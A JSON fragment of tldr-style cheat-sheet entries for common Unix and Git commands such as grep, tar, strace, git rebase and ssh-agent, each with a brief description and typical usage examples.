    "git-count-objects": "# git count-objects\n> Count the number of unpacked objects and their disk consumption. More\n> information: https://git-scm.com/docs/git-count-objects.\n  * Count all objects and display the total disk usage:\n`git count-objects`\n  * Display a count of all objects and their total disk usage, displaying sizes in human-readable units:\n`git count-objects --human-readable`\n  * Display more verbose information:\n`git count-objects --verbose`\n  * Display more verbose information, displaying sizes in human-readable units:\n`git count-objects --human-readable --verbose`",
    "git-shortlog": "# git shortlog\n> Summarizes the `git log` output. More information: https://git-\n> scm.com/docs/git-shortlog.\n  * View a summary of all the commits made, grouped alphabetically by author name:\n`git shortlog`\n  * View a summary of all the commits made, sorted by the number of commits made:\n`git shortlog -n`\n  * View a summary of all the commits made, grouped by the committer identities (name and email):\n`git shortlog -c`\n  * View a summary of the last 5 commits (i.e. specify a revision range):\n`git shortlog HEAD~{{5}}..HEAD`\n  * View all users, emails and the number of commits in the current branch:\n`git shortlog -sne`\n  * View all users, emails and the number of commits in all branches:\n`git shortlog -sne --all`",
    "pv": "# pv\n> Monitor the progress of data through a pipe. More information:\n> https://manned.org/pv.\n  * Print the contents of the file and display a progress bar:\n`pv {{path/to/file}}`\n  * Measure the speed and amount of data flow between pipes (`--size` is optional):\n`command1 | pv --size {{expected_amount_of_data_for_eta}} | command2`\n  * Filter a file, see both progress and amount of output data:\n`pv -cN in {{big_text_file}} | grep {{pattern}} | pv -cN out >\n{{filtered_file}}`\n  * Attach to an already running process and see its file reading progress:\n`pv -d {{PID}}`\n  * Read an erroneous file, skip errors as `dd conv=sync,noerror` would:\n`pv -EE {{path/to/faulty_media}} > image.img`\n  * Stop reading after reading specified amount of data, rate limit to 1K/s:\n`pv -L 1K --stop-at --size {{maximum_file_size_to_be_read}}`",
    "grep": "# grep\n> Find patterns in files using regular expressions. More information:\n> https://www.gnu.org/software/grep/manual/grep.html.\n  * Search for a pattern within a file:\n`grep \"{{search_pattern}}\" {{path/to/file}}`\n  * Search for an exact string (disables regular expressions):\n`grep --fixed-strings \"{{exact_string}}\" {{path/to/file}}`\n  * Search for a pattern in all files recursively in a directory, showing line numbers of matches, ignoring binary files:\n`grep --recursive --line-number --binary-files={{without-match}}\n\"{{search_pattern}}\" {{path/to/directory}}`\n  * Use extended regular expressions (supports `?`, `+`, `{}`, `()` and `|`), in case-insensitive mode:\n`grep --extended-regexp --ignore-case \"{{search_pattern}}\" {{path/to/file}}`\n  * Print 3 lines of context around, before, or after each match:\n`grep --{{context|before-context|after-context}}={{3}} \"{{search_pattern}}\"\n{{path/to/file}}`\n  * Print file name and line number for each match with color output:\n`grep --with-filename --line-number --color=always \"{{search_pattern}}\"\n{{path/to/file}}`\n  * Search for lines matching a pattern, printing only the matched text:\n`grep --only-matching \"{{search_pattern}}\" {{path/to/file}}`\n  * Search `stdin` for lines that do not match a pattern:\n`cat {{path/to/file}} | grep --invert-match \"{{search_pattern}}\"`",
    "link": "# link\n> Create a hard link to an existing file. For more options, see the `ln`\n> command. More information: https://www.gnu.org/software/coreutils/link.\n  * Create a hard link from a new file to an existing file:\n`link {{path/to/existing_file}} {{path/to/new_file}}`",
    "paste": "# paste\n> Merge lines of files. More information:\n> https://www.gnu.org/software/coreutils/paste.\n  * Join all the lines into a single line, using TAB as delimiter:\n`paste -s {{path/to/file}}`\n  * Join all the lines into a single line, using the specified delimiter:\n`paste -s -d {{delimiter}} {{path/to/file}}`\n  * Merge two files side by side, each in its column, using TAB as delimiter:\n`paste {{file1}} {{file2}}`\n  * Merge two files side by side, each in its column, using the specified delimiter:\n`paste -d {{delimiter}} {{file1}} {{file2}}`\n  * Merge two files, with lines added alternatively:\n`paste -d '\\n' {{file1}} {{file2}}`",
    "ls": "# ls\n> List directory contents. More information:\n> https://www.gnu.org/software/coreutils/ls.\n  * List files one per line:\n`ls -1`\n  * List all files, including hidden files:\n`ls -a`\n  * List all files, with trailing `/` added to directory names:\n`ls -F`\n  * Long format list (permissions, ownership, size, and modification date) of all files:\n`ls -la`\n  * Long format list with size displayed using human-readable units (KiB, MiB, GiB):\n`ls -lh`\n  * Long format list sorted by size (descending):\n`ls -lS`\n  * Long format list of all files, sorted by modification date (oldest first):\n`ls -ltr`\n  * Only list directories:\n`ls -d */`",
    "git-range-diff": "# git range-diff\n> Compare two commit ranges (e.g. two versions of a branch). More information:\n> https://git-scm.com/docs/git-range-diff.\n  * Diff the changes of two individual commits:\n`git range-diff {{commit_1}}^! {{commit_2}}^!`\n  * Diff the changes of ours and theirs from their common ancestor, e.g. after an interactive rebase:\n`git range-diff {{theirs}}...{{ours}}`\n  * Diff the changes of two commit ranges, e.g. to check whether conflicts have been resolved appropriately when rebasing commits from `base1` to `base2`:\n`git range-diff {{base1}}..{{rev1}} {{base2}}..{{rev2}}`",
    "quilt": "# quilt\n> Tool to manage a series of patches. More information:\n> https://savannah.nongnu.org/projects/quilt.\n  * Import an existing patch from a file:\n`quilt import {{path/to/filename.patch}}`\n  * Create a new patch:\n`quilt new {{filename.patch}}`\n  * Add a file to the current patch:\n`quilt add {{path/to/file}}`\n  * After editing the file, refresh the current patch with the changes:\n`quilt refresh`\n  * Apply all the patches in the series file:\n`quilt push -a`\n  * Remove all applied patches:\n`quilt pop -a`",
    "nohup": "# nohup\n> Allows for a process to live when the terminal gets killed. More\n> information: https://www.gnu.org/software/coreutils/nohup.\n  * Run a process that can live beyond the terminal:\n`nohup {{command}} {{argument1 argument2 ...}}`\n  * Launch `nohup` in background mode:\n`nohup {{command}} {{argument1 argument2 ...}} &`\n  * Run a shell script that can live beyond the terminal:\n`nohup {{path/to/script.sh}} &`\n  * Run a process and write the output to a specific file:\n`nohup {{command}} {{argument1 argument2 ...}} > {{path/to/output_file}} &`",
    "expand": "# expand\n> Convert tabs to spaces. More information:\n> https://www.gnu.org/software/coreutils/expand.\n  * Convert tabs in each file to spaces, writing to `stdout`:\n`expand {{path/to/file}}`\n  * Convert tabs to spaces, reading from `stdin`:\n`expand`\n  * Do not convert tabs after non blanks:\n`expand -i {{path/to/file}}`\n  * Have tabs a certain number of characters apart, not 8:\n`expand -t={{number}} {{path/to/file}}`\n  * Use a comma separated list of explicit tab positions:\n`expand -t={{1,4,6}}`",
    "strace": "# strace\n> Troubleshooting tool for tracing system calls. More information:\n> https://manned.org/strace.\n  * Start tracing a specific process by its PID:\n`strace -p {{pid}}`\n  * Trace a process and filter output by system call:\n`strace -p {{pid}} -e {{system_call_name}}`\n  * Count time, calls, and errors for each system call and report a summary on program exit:\n`strace -p {{pid}} -c`\n  * Show the time spent in every system call:\n`strace -p {{pid}} -T`\n  * Start tracing a program by executing it:\n`strace {{program}}`\n  * Start tracing file operations of a program:\n`strace -e trace=file {{program}}`",
    "cmp": "# cmp\n> Compare two files byte by byte. More information:\n> https://www.gnu.org/software/diffutils/manual/html_node/Invoking-cmp.html.\n  * Output char and line number of the first difference between two files:\n`cmp {{path/to/file1}} {{path/to/file2}}`\n  * Output info of the first difference: char, line number, bytes, and values:\n`cmp --print-bytes {{path/to/file1}} {{path/to/file2}}`\n  * Output the byte numbers and values of every difference:\n`cmp --verbose {{path/to/file1}} {{path/to/file2}}`\n  * Compare files but output nothing, yield only the exit status:\n`cmp --quiet {{path/to/file1}} {{path/to/file2}}`",
    "coredumpctl": "# coredumpctl\n> Retrieve and process saved core dumps and metadata. More information:\n> https://www.freedesktop.org/software/systemd/man/coredumpctl.html.\n  * List all captured core dumps:\n`coredumpctl list`\n  * List captured core dumps for a program:\n`coredumpctl list {{program}}`\n  * Show information about the core dumps matching a program with `PID`:\n`coredumpctl info {{PID}}`\n  * Invoke debugger using the last core dump of a program:\n`coredumpctl debug {{program}}`\n  * Extract the last core dump of a program to a file:\n`coredumpctl --output={{path/to/file}} dump {{program}}`",
    "unshare": "# unshare\n> Execute a command in new user-defined namespaces. More information:\n> https://www.kernel.org/doc/html/latest/userspace-api/unshare.html.\n  * Execute a command without sharing access to connected networks:\n`unshare --net {{command}} {{command_arguments}}`\n  * Execute a command as a child process without sharing mounts, processes, or networks:\n`unshare --mount --pid --net --fork {{command}} {{command_arguments}}`",
    "git-switch": "# git switch\n> Switch between Git branches. Requires Git version 2.23+. See also `git\n> checkout`. More information: https://git-scm.com/docs/git-switch.\n  * Switch to an existing branch:\n`git switch {{branch_name}}`\n  * Create a new branch and switch to it:\n`git switch --create {{branch_name}}`\n  * Create a new branch based on an existing commit and switch to it:\n`git switch --create {{branch_name}} {{commit}}`\n  * Switch to the previous branch:\n`git switch -`\n  * Switch to a branch and update all submodules to match:\n`git switch --recurse-submodules {{branch_name}}`\n  * Switch to a branch and automatically merge the current branch and any uncommitted changes into it:\n`git switch --merge {{branch_name}}`",
    "dpkg": "# dpkg\n> Debian package manager. Some subcommands such as `dpkg deb` have their own\n> usage documentation. For equivalent commands in other package managers, see\n> https://wiki.archlinux.org/title/Pacman/Rosetta. More information:\n> https://manpages.debian.org/latest/dpkg/dpkg.html.\n  * Install a package:\n`dpkg -i {{path/to/file.deb}}`\n  * Remove a package:\n`dpkg -r {{package}}`\n  * List installed packages:\n`dpkg -l {{pattern}}`\n  * List a package's contents:\n`dpkg -L {{package}}`\n  * List contents of a local package file:\n`dpkg -c {{path/to/file.deb}}`\n  * Find out which package owns a file:\n`dpkg -S {{path/to/file}}`",
    "m4": "# m4\n> Macro processor. More information: https://www.gnu.org/software/m4.\n  * Process macros in a file:\n`m4 {{path/to/file}}`\n  * Define a macro before processing files:\n`m4 -D{{macro_name}}={{macro_value}} {{path/to/file}}`",
    "git-rebase": "# git rebase\n> Reapply commits from one branch on top of another branch. Commonly used to\n> \"move\" an entire branch to another base, creating copies of the commits in\n> the new location. More information: https://git-scm.com/docs/git-rebase.\n  * Rebase the current branch on top of another specified branch:\n`git rebase {{new_base_branch}}`\n  * Start an interactive rebase, which allows the commits to be reordered, omitted, combined or modified:\n`git rebase -i {{target_base_branch_or_commit_hash}}`\n  * Continue a rebase that was interrupted by a merge failure, after editing conflicting files:\n`git rebase --continue`\n  * Continue a rebase that was paused due to merge conflicts, by skipping the conflicted commit:\n`git rebase --skip`\n  * Abort a rebase in progress (e.g. if it is interrupted by a merge conflict):\n`git rebase --abort`\n  * Move part of the current branch onto a new base, providing the old base to start from:\n`git rebase --onto {{new_base}} {{old_base}}`\n  * Reapply the last 5 commits in-place, stopping to allow them to be reordered, omitted, combined or modified:\n`git rebase -i {{HEAD~5}}`\n  * Auto-resolve any conflicts by favoring the working branch version (`theirs` keyword has reversed meaning in this case):\n`git rebase -X theirs {{branch_name}}`",
    "git-commit-graph": "# git commit-graph\n> Write and verify Git commit-graph files. More information: https://git-\n> scm.com/docs/git-commit-graph.\n  * Write a commit-graph file for the packed commits in the repository's local `.git` directory:\n`git commit-graph write`\n  * Write a commit-graph file containing all reachable commits:\n`git show-ref --hash | git commit-graph write --stdin-commits`\n  * Write a commit-graph file containing all commits in the current commit-graph file along with those reachable from `HEAD`:\n`git rev-parse {{HEAD}} | git commit-graph write --stdin-commits --append`",
    "chroot": "# chroot\n> Run command or interactive shell with special root directory. More\n> information: https://www.gnu.org/software/coreutils/chroot.\n  * Run command as new root directory:\n`chroot {{path/to/new/root}} {{command}}`\n  * Specify user and group (ID or name) to use:\n`chroot --userspec={{user:group}}`",
    "less": "# less\n> Open a file for interactive reading, allowing scrolling and search. More\n> information: https://greenwoodsoftware.com/less/.\n  * Open a file:\n`less {{source_file}}`\n  * Page down/up:\n`<Space> (down), b (up)`\n  * Go to end/start of file:\n`G (end), g (start)`\n  * Forward search for a string (press `n`/`N` to go to next/previous match):\n`/{{something}}`\n  * Backward search for a string (press `n`/`N` to go to next/previous match):\n`?{{something}}`\n  * Follow the output of the currently opened file:\n`F`\n  * Open the current file in an editor:\n`v`\n  * Exit:\n`q`",
    "git-add": "# git add\n> Adds changed files to the index. More information: https://git-\n> scm.com/docs/git-add.\n  * Add a file to the index:\n`git add {{path/to/file}}`\n  * Add all files (tracked and untracked):\n`git add -A`\n  * Only add already tracked files:\n`git add -u`\n  * Also add ignored files:\n`git add -f`\n  * Interactively stage parts of files:\n`git add -p`\n  * Interactively stage parts of a given file:\n`git add -p {{path/to/file}}`\n  * Interactively stage a file:\n`git add -i`",
    "indent": "# indent\n> Change the appearance of a C/C++ program by inserting or deleting\n> whitespace. More information:\n> https://www.freebsd.org/cgi/man.cgi?query=indent.\n  * Format C/C++ source according to the Berkeley style:\n`indent {{path/to/source_file.c}} {{path/to/indented_file.c}} -nbad -nbap -bc\n-br -c33 -cd33 -cdb -ce -ci4 -cli0 -di16 -fc1 -fcb -i4 -ip -l75 -lp -npcs\n-nprs -psl -sc -nsob -ts8`\n  * Format C/C++ source according to the style of Kernighan & Ritchie (K&R):\n`indent {{path/to/source_file.c}} {{path/to/indented_file.c}} -nbad -bap -nbc\n-br -c33 -cd33 -ncdb -ce -ci4 -cli0 -cs -d0 -di1 -nfc1 -nfcb -i4 -nip -l75 -lp\n-npcs -nprs -npsl -nsc -nsob`",
    "stty": "# stty\n> Set options for a terminal device interface. More information:\n> https://www.gnu.org/software/coreutils/stty.\n  * Display all settings for the current terminal:\n`stty --all`\n  * Set the number of rows or columns:\n`stty {{rows|cols}} {{count}}`\n  * Get the actual transfer speed of a device:\n`stty --file {{path/to/device_file}} speed`\n  * Reset all modes to reasonable values for the current terminal:\n`stty sane`",
    "git-column": "# git column\n> Display data in columns. More information: https://git-scm.com/docs/git-\n> column.\n  * Format `stdin` as multiple columns:\n`ls | git column --mode={{column}}`\n  * Format `stdin` as multiple columns with a maximum width of `100`:\n`ls | git column --mode=column --width={{100}}`\n  * Format `stdin` as multiple columns with a maximum padding of `30`:\n`ls | git column --mode=column --padding={{30}}`",
    "git-notes": "# git notes\n> Add or inspect object notes. More information: https://git-scm.com/docs/git-\n> notes.\n  * List all notes and the objects they are attached to:\n`git notes list`\n  * List all notes attached to a given object (defaults to HEAD):\n`git notes list [{{object}}]`\n  * Show the notes attached to a given object (defaults to HEAD):\n`git notes show [{{object}}]`\n  * Append a note to a specified object (opens the default text editor):\n`git notes append {{object}}`\n  * Append a note to a specified object, specifying the message:\n`git notes append --message=\"{{message_text}}\"`\n  * Edit an existing note (defaults to HEAD):\n`git notes edit [{{object}}]`\n  * Copy a note from one object to another:\n`git notes copy {{source_object}} {{target_object}}`\n  * Remove all the notes added to a specified object:\n`git notes remove {{object}}`",
    "git-mv": "# git mv\n> Move or rename files and update the Git index. More information:\n> https://git-scm.com/docs/git-mv.\n  * Move a file inside the repo and add the movement to the next commit:\n`git mv {{path/to/file}} {{new/path/to/file}}`\n  * Rename a file or directory and add the renaming to the next commit:\n`git mv {{path/to/file_or_directory}} {{path/to/destination}}`\n  * Overwrite the file or directory in the target path if it exists:\n`git mv --force {{path/to/file_or_directory}} {{path/to/destination}}`",
    "bash": "# bash\n> Bourne-Again SHell, an `sh`-compatible command-line interpreter. See also:\n> `zsh`, `histexpand` (history expansion). More information:\n> https://gnu.org/software/bash/.\n  * Start an interactive shell session:\n`bash`\n  * Start an interactive shell session without loading startup configs:\n`bash --norc`\n  * Execute specific [c]ommands:\n`bash -c \"{{echo 'bash is executed'}}\"`\n  * Execute a specific script:\n`bash {{path/to/script.sh}}`\n  * Execute a specific script while printing each command before executing it:\n`bash -x {{path/to/script.sh}}`\n  * Execute a specific script and stop at the first [e]rror:\n`bash -e {{path/to/script.sh}}`\n  * Execute specific commands from `stdin`:\n`{{echo \"echo 'bash is executed'\"}} | bash`\n  * Start a [r]estricted shell session:\n`bash -r`",
    "exit": "# exit\n> Exit the shell. More information: https://manned.org/exit.\n  * Exit the shell with the exit code of the last command executed:\n`exit`\n  * Exit the shell with the specified exit code:\n`exit {{exit_code}}`",
    "uniq": "# uniq\n> Output the unique lines from the given input or file. Since it does not\n> detect repeated lines unless they are adjacent, we need to sort them first.\n> More information: https://www.gnu.org/software/coreutils/uniq.\n  * Display each line once:\n`sort {{path/to/file}} | uniq`\n  * Display only unique lines:\n`sort {{path/to/file}} | uniq -u`\n  * Display only duplicate lines:\n`sort {{path/to/file}} | uniq -d`\n  * Display number of occurrences of each line along with that line:\n`sort {{path/to/file}} | uniq -c`\n  * Display number of occurrences of each line, sorted by the most frequent:\n`sort {{path/to/file}} | uniq -c | sort -nr`",
    "git-mailinfo": "# git mailinfo\n> Extract patch and authorship information from a single email message. More\n> information: https://git-scm.com/docs/git-mailinfo.\n  * Extract the patch and author data from an email message:\n`git mailinfo {{message|patch}}`\n  * Extract but remove leading and trailing whitespace:\n`git mailinfo -k {{message|patch}}`\n  * Remove everything from the body before a scissors line (e.g. \"-->* --\") and retrieve the message or patch:\n`git mailinfo --scissors {{message|patch}}`",
    "git-annotate": "# git annotate\n> Show commit hash and last author on each line of a file. See `git blame`,\n> which is preferred over `git annotate`. `git annotate` is provided for those\n> familiar with other version control systems. More information: https://git-\n> scm.com/docs/git-annotate.\n  * Print a file with the author name and commit hash prepended to each line:\n`git annotate {{path/to/file}}`\n  * Print a file with the author email and commit hash prepended to each line:\n`git annotate -e {{path/to/file}}`\n  * Print only rows that match a regular expression:\n`git annotate -L :{{regexp}} {{path/to/file}}`",
    "sha1sum": "# sha1sum\n> Calculate SHA1 cryptographic checksums. More information:\n> https://www.gnu.org/software/coreutils/sha1sum.\n  * Calculate the SHA1 checksum for one or more files:\n`sha1sum {{path/to/file1 path/to/file2 ...}}`\n  * Calculate and save the list of SHA1 checksums to a file:\n`sha1sum {{path/to/file1 path/to/file2 ...}} > {{path/to/file.sha1}}`\n  * Calculate a SHA1 checksum from `stdin`:\n`{{command}} | sha1sum`\n  * Read a file of SHA1 sums and filenames and verify all files have matching checksums:\n`sha1sum --check {{path/to/file.sha1}}`\n  * Only show a message for missing files or when verification fails:\n`sha1sum --check --quiet {{path/to/file.sha1}}`\n  * Only show a message when verification fails, ignoring missing files:\n`sha1sum --ignore-missing --check --quiet {{path/to/file.sha1}}`",
    "systemd-analyze": "# systemd-analyze\n> Analyze and debug system manager. Show timing details about the boot process\n> of units (services, mount points, devices, sockets). More information:\n> https://www.freedesktop.org/software/systemd/man/systemd-analyze.html.\n  * List all running units, ordered by the time they took to initialize:\n`systemd-analyze blame`\n  * Print a tree of the time-critical chain of units:\n`systemd-analyze critical-chain`\n  * Create an SVG file showing when each system service started, highlighting the time that they spent on initialization:\n`systemd-analyze plot > {{path/to/file.svg}}`\n  * Plot a dependency graph and convert it to an SVG file:\n`systemd-analyze dot | dot -T{{svg}} > {{path/to/file.svg}}`\n  * Show security scores of running units:\n`systemd-analyze security`",
    "timeout": "# timeout\n> Run a command with a time limit. More information:\n> https://www.gnu.org/software/coreutils/timeout.\n  * Run `sleep 10` and terminate it, if it runs for more than 3 seconds:\n`timeout {{3s}} {{sleep 10}}`\n  * Specify the signal to be sent to the command after the time limit expires. (By default, TERM is sent):\n`timeout --signal {{INT}} {{5s}} {{sleep 10}}`",
    "git-am": "# git am\n> Apply patch files and create a commit. Useful when receiving commits via\n> email. See also `git format-patch`, which can generate patch files. More\n> information: https://git-scm.com/docs/git-am.\n  * Apply and commit changes following a local patch file:\n`git am {{path/to/file.patch}}`\n  * Apply and commit changes following a remote patch file:\n`curl -L {{https://example.com/file.patch}} | git apply`\n  * Abort the process of applying a patch file:\n`git am --abort`\n  * Apply as much of a patch file as possible, saving failed hunks to reject files:\n`git am --reject {{path/to/file.patch}}`",
    "strings": "# strings\n> Find printable strings in an object file or binary. More information:\n> https://manned.org/strings.\n  * Print all strings in a binary:\n`strings {{path/to/file}}`\n  * Limit results to strings at least length characters long:\n`strings -n {{length}} {{path/to/file}}`\n  * Prefix each result with its offset within the file:\n`strings -t d {{path/to/file}}`\n  * Prefix each result with its offset within the file in hexadecimal:\n`strings -t x {{path/to/file}}`",
    "git-pull": "# git pull\n> Fetch branch from a remote repository and merge it to local repository. More\n> information: https://git-scm.com/docs/git-pull.\n  * Download changes from default remote repository and merge it:\n`git pull`\n  * Download changes from default remote repository and use fast-forward:\n`git pull --rebase`\n  * Download changes from given remote repository and branch, then merge them into HEAD:\n`git pull {{remote_name}} {{branch}}`",
    "yacc": "# yacc\n> Generate an LALR parser (in C) with a given formal grammar specification\n> file. See also: `bison`. More information: https://manned.org/man/yacc.1p.\n  * Create a file `y.tab.c` containing the C parser code and compile the grammar file with all necessary constant declarations for values. (Constant declarations file `y.tab.h` is created only when the `-d` flag is used):\n`yacc -d {{path/to/grammar_file.y}}`\n  * Compile a grammar file containing the description of the parser and a report of conflicts generated by ambiguities in the grammar:\n`yacc -d {{path/to/grammar_file.y}} -v`\n  * Compile a grammar file, and prefix output filenames with `prefix` instead of `y`:\n`yacc -d {{path/to/grammar_file.y}} -v -b {{prefix}}`",
    "df": "# df\n> Gives an overview of the filesystem disk space usage. More information:\n> https://www.gnu.org/software/coreutils/df.\n  * Display all filesystems and their disk usage:\n`df`\n  * Display all filesystems and their disk usage in human-readable form:\n`df -h`\n  * Display the filesystem and its disk usage containing the given file or directory:\n`df {{path/to/file_or_directory}}`\n  * Display statistics on the number of free inodes:\n`df -i`\n  * Display filesystems but exclude the specified types:\n`df -x {{squashfs}} -x {{tmpfs}}`",
    "ipcmk": "# ipcmk\n> Create IPC (Inter-process Communication) resources. More information:\n> https://manned.org/ipcmk.\n  * Create a shared memory segment:\n`ipcmk --shmem {{segment_size_in_bytes}}`\n  * Create a semaphore:\n`ipcmk --semaphore {{element_size}}`\n  * Create a message queue:\n`ipcmk --queue`\n  * Create a shared memory segment with specific permissions (default is 0644):\n`ipcmk --shmem {{segment_size_in_bytes}} {{octal_permissions}}`",
    "ssh-agent": "# ssh-agent\n> Spawn an SSH Agent process. An SSH Agent holds SSH keys decrypted in memory\n> until removed or the process is killed. See also `ssh-add`, which can add\n> and manage keys held by an SSH Agent. More information:\n> https://man.openbsd.org/ssh-agent.\n  * Start an SSH Agent for the current shell:\n`eval $(ssh-agent)`\n  * Kill the currently running agent:\n`ssh-agent -k`",
    "basenc": "# basenc\n> Encode or decode file or `stdin` using a specified encoding, to `stdout`.\n> More information: https://www.gnu.org/software/coreutils/basenc.\n  * Encode a file with base64 encoding:\n`basenc --base64 {{path/to/file}}`\n  * Decode a file with base64 encoding:\n`basenc --decode --base64 {{path/to/file}}`\n  * Encode from `stdin` with base32 encoding with 42 columns:\n`{{command}} | basenc --base32 -w42`\n  * Encode from `stdin` with base32 encoding:\n`{{command}} | basenc --base32`",
    "unlink": "# unlink\n> Remove a link to a file from the filesystem. The file contents is lost if\n> the link is the last one to the file. More information:\n> https://www.gnu.org/software/coreutils/unlink.\n  * Remove the specified file if it is the last link:\n`unlink {{path/to/file}}`",
    "git-show": "# git show\n> Show various types of Git objects (commits, tags, etc.). More information:\n> https://git-scm.com/docs/git-show.\n  * Show information about the latest commit (hash, message, changes, and other metadata):\n`git show`\n  * Show information about a given commit:\n`git show {{commit}}`\n  * Show information about the commit associated with a given tag:\n`git show {{tag}}`\n  * Show information about the 3rd commit from the HEAD of a branch:\n`git show {{branch}}~{{3}}`\n  * Show a commit's message in a single line, suppressing the diff output:\n`git show --oneline -s {{commit}}`\n  * Show only statistics (added/removed characters) about the changed files:\n`git show --stat {{commit}}`\n  * Show only the list of added, renamed or deleted files:\n`git show --summary {{commit}}`\n  * Show the contents of a file as it was at a given revision (e.g. branch, tag or commit):\n`git show {{revision}}:{{path/to/file}}`",
    "tar": "# tar\n> Archiving utility. Often combined with a compression method, such as gzip or\n> bzip2. More information: https://www.gnu.org/software/tar.\n  * [c]reate an archive and write it to a [f]ile:\n`tar cf {{path/to/target.tar}} {{path/to/file1 path/to/file2 ...}}`\n  * [c]reate a g[z]ipped archive and write it to a [f]ile:\n`tar czf {{path/to/target.tar.gz}} {{path/to/file1 path/to/file2 ...}}`\n  * [c]reate a g[z]ipped archive from a directory using relative paths:\n`tar czf {{path/to/target.tar.gz}} --directory={{path/to/directory}} .`\n  * E[x]tract a (compressed) archive [f]ile into the current directory [v]erbosely:\n`tar xvf {{path/to/source.tar[.gz|.bz2|.xz]}}`\n  * E[x]tract a (compressed) archive [f]ile into the target directory:\n`tar xf {{path/to/source.tar[.gz|.bz2|.xz]}}\n--directory={{path/to/directory}}`\n  * [c]reate a compressed archive and write it to a [f]ile, using [a]rchive suffix to determine the compression program:\n`tar caf {{path/to/target.tar.xz}} {{path/to/file1 path/to/file2 ...}}`\n  * Lis[t] the contents of a tar [f]ile [v]erbosely:\n`tar tvf {{path/to/source.tar}}`\n  * E[x]tract files matching a pattern from an archive [f]ile:\n`tar xf {{path/to/source.tar}} --wildcards \"{{*.html}}\"`",
    "pr": "# pr\n> Paginate or columnate files for printing. More information:\n> https://www.gnu.org/software/coreutils/pr.\n  * Print multiple files with a default header and footer:\n`pr {{file1}} {{file2}} {{file3}}`\n  * Print with a custom centered header:\n`pr -h \"{{header}}\" {{file1}} {{file2}} {{file3}}`\n  * Print with numbered lines and a custom date format:\n`pr -n -D \"{{format}}\" {{file1}} {{file2}} {{file3}}`\n  * Print all files together, one in each column, without a header or footer:\n`pr -m -T {{file1}} {{file2}} {{file3}}`\n  * Print, beginning at page 2 up to page 5, with a given page length (including header and footer):\n`pr +{{2}}:{{5}} -l {{page_length}} {{file1}} {{file2}} {{file3}}`\n  * Print with an offset for each line and a truncating custom page width:\n`pr -o {{offset}} -W {{width}} {{file1}} {{file2}} {{file3}}`",
    "git-restore": "# git restore\n> Restore working tree files. Requires Git version 2.23+. See also `git\n> checkout` and `git reset`. More information: https://git-scm.com/docs/git-\n> restore.\n  * Restore an unstaged file to the version of the current commit (HEAD):\n`git restore {{path/to/file}}`\n  * Restore an unstaged file to the version of a specific commit:\n`git restore --source {{commit}} {{path/to/file}}`\n  * Discard all unstaged changes to tracked files:\n`git restore :/`\n  * Unstage a file:\n`git restore --staged {{path/to/file}}`\n  * Unstage all files:\n`git restore --staged :/`\n  * Discard all changes to files, both staged and unstaged:\n`git restore --worktree --staged :/`\n  * Interactively select sections of files to restore:\n`git restore --patch`",
    "git-archive": "# git archive\n> Create an archive of files from a named tree. More information: https://git-\n> scm.com/docs/git-archive.\n  * Create a tar archive from the contents of the current HEAD and print it to `stdout`:\n`git archive --verbose HEAD`\n  * Create a zip archive from the current HEAD and print it to `stdout`:\n`git archive --verbose --format=zip HEAD`\n  * Same as above, but write the zip archive to file:\n`git archive --verbose --output={{path/to/file.zip}} HEAD`\n  * Create a tar archive from the contents of the latest commit on a specific branch:\n`git archive --output={{path/to/file.tar}} {{branch_name}}`\n  * Create a tar archive from the contents of a specific directory:\n`git archive --output={{path/to/file.tar}} HEAD:{{path/to/directory}}`\n  * Prepend a path to each file to archive it inside a specific directory:\n`git archive --output={{path/to/file.tar}} --prefix={{path/to/prepend}}/ HEAD`",
    "tee": "# tee\n> Read from `stdin` and write to `stdout` and files (or commands). More\n> information: https://www.gnu.org/software/coreutils/tee.\n  * Copy `stdin` to each file, and also to `stdout`:\n`echo \"example\" | tee {{path/to/file}}`\n  * Append to the given files, do not overwrite:\n`echo \"example\" | tee -a {{path/to/file}}`\n  * Print `stdin` to the terminal, and also pipe it into another program for further processing:\n`echo \"example\" | tee {{/dev/tty}} | {{xargs printf \"[%s]\"}}`\n  * Create a directory called \"example\", count the number of characters in \"example\" and write \"example\" to the terminal:\n`echo \"example\" | tee >(xargs mkdir) >(wc -c)`",
    "join": "# join\n> Join lines of two sorted files on a common field. More information:\n> https://www.gnu.org/software/coreutils/join.\n  * Join two files on the first (default) field:\n`join {{file1}} {{file2}}`\n  * Join two files using a comma (instead of a space) as the field separator:\n`join -t {{','}} {{file1}} {{file2}}`\n  * Join field3 of file1 with field1 of file2:\n`join -1 {{3}} -2 {{1}} {{file1}} {{file2}}`\n  * Produce a line for each unpairable line for file1:\n`join -a {{1}} {{file1}} {{file2}}`\n  * Join a file from `stdin`:\n`cat {{path/to/file1}} | join - {{path/to/file2}}`",
    "pidof": "# pidof\n> Gets the ID of a process using its name. More information:\n> https://manned.org/pidof.\n  * List all process IDs with given name:\n`pidof {{bash}}`\n  * List a single process ID with given name:\n`pidof -s {{bash}}`\n  * List process IDs including scripts with given name:\n`pidof -x {{script.py}}`\n  * Kill all processes with given name:\n`kill $(pidof {{name}})`",
    "git-difftool": "# git difftool\n> Show file changes using external diff tools. Accepts the same options and\n> arguments as `git diff`. See also: `git diff`. More information:\n> https://git-scm.com/docs/git-difftool.\n  * List available diff tools:\n`git difftool --tool-help`\n  * Set the default diff tool to meld:\n`git config --global diff.tool \"{{meld}}\"`\n  * Use the default diff tool to show staged changes:\n`git difftool --staged`\n  * Use a specific tool (opendiff) to show changes since a given commit:\n`git difftool --tool={{opendiff}} {{commit}}`",
    "wc": "# wc\n> Count lines, words, or bytes. More information:\n> https://ss64.com/osx/wc.html.\n  * Count lines in file:\n`wc -l {{path/to/file}}`\n  * Count words in file:\n`wc -w {{path/to/file}}`\n  * Count characters (bytes) in file:\n`wc -c {{path/to/file}}`\n  * Count characters in file (taking multi-byte character sets into account):\n`wc -m {{path/to/file}}`\n  * Use `stdin` to count lines, words and characters (bytes) in that order:\n`{{find .}} | wc`",
    "command": "# command\n> Command forces the shell to execute the program and ignore any functions,\n> builtins and aliases with the same name. More information:\n> https://manned.org/command.\n  * Execute the `ls` program literally, even if an `ls` alias exists:\n`command {{ls}}`\n  * Display the path to the executable or the alias definition of a specific command:\n`command -v {{command_name}}`",
    "getent": "# getent\n> Get entries from Name Service Switch libraries. More information:\n> https://manned.org/getent.\n  * Get list of all groups:\n`getent group`\n  * See the members of a group:\n`getent group {{group_name}}`\n  * Get list of all services:\n`getent services`\n  * Find a username by UID:\n`getent passwd 1000`\n  * Perform a reverse DNS lookup:\n`getent hosts {{host}}`",
